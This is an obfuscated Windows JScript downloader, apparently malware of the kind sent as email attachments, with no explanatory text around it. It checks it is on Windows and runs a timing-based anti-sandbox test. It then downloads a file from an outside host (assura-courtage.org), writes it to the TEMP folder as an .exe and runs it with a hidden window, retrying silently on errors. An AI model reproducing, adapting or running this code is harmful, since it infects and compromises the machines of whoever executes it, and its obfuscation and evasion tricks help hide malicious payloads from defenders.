var _IR = false;
var _NE = "CreateObject";
var _E2 = function _U() {return WScript[_NE]("WScript"+".Shell");}(), _R = 11;
var _T = "MSXML2.XMLHTTP";
var _Y = 2123213;
var _BQ = 0;
function _K(_X){_E2["Run"](_X, _BQ, _BQ);};
function _C(){return _T + "";};
function _GS(_I1, _PF){_BQ = _BQ * 1; return _I1 - _PF;};
function _Q0(){return _NE;};
/*@cc_on
  @if (@_win32 || @_win64)
    _IR = true;
  @end
@*/
if (_IR)
{
var _I = "";
function _W(){return 22;};
var _ZM = 0; var _V0 = 0;
function _E0()
{
var _YY = new this["Date"]();
var _MX = _YY["getUTCMilliseconds"]();
WScript["Sleep"](_W());
var _YY = new this["Date"]();
var _MZ = _YY["getUTCMilliseconds"]();
WScript["Sleep"](_W());
var _YY = new this["Date"]();
var _J = _YY["getUTCMilliseconds"]();
var _ZM = "_AB";
_ZM = _GS(_MZ, _MX);
var _V0 = "_O";
_V0 = _GS(_J, _MZ);
_I = "open";
return _GS(_ZM, _V0);
}
var _M = false;
var _H = false;
for (var _V = _BQ; _V < _W() * 1; _V++){if (_E0() != _BQ){
_M = true; 
_V0 = "31" + 11 * _ZM + _V0; 
_H = true; 
break;
}}
function _E() {return ((_M == true) && (_M == _H)) ? 1 : _BQ;};
if (_M && _E() && _H){
function _Q() {return _E2["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "kVJ5B4ZWpP0ZyW.ex" + "e";};
 _LK = _C();
 _I0 = WScript[_NE](_LK);
 var _D = 1;
 while (_D){
try {
	if (_D == 1)
	{
		_I0[_I]("GET", "http://assura-courtage.org/j2osla", false);
		_I0["send"]();
		_E1 = "Sleep";
	}
	WScript[_E1](_W() + 120); 
	if (_I0["readystate"] < 2 * 2) continue;
	_D = _BQ;
	function _L(_NS) {var _PZ = (1, 2, 3, 4, 5, _NS); return _PZ;};
	_UD = WScript[_Q0()]("ADODB.Stream");
	_LK = _UD;
	_LK[_I]();
	_LK["type"] = _L(1);
	_LK["write"](_I0["ResponseBody"]);
	_UD["position"] = _L(_BQ);
	_LK["Save" + "ToFile"](_Q(), 2);
	_UD["cl"+"ose"]();
	_DK = _Q();
	_K(_DK);
} catch(_QW){};
}
}
}

